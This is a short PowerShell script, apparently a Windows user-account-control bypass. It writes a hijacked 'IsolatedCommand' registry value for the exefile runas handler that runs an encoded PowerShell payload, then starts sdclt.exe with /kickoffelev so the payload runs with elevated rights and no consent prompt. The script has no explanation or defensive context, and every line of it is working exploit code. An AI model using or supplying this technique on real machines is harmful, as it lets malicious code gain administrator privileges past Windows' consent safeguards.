$commandPath = 'HKCU:\Software\Classes\exefile\shell\runas\command'
$handler = 'powershell.exe -EncodedCommand ' + $payload
New-ItemProperty -Path $commandPath -Name IsolatedCommand -Value $handler
Start-Process sdclt.exe -ArgumentList /kickoffelev
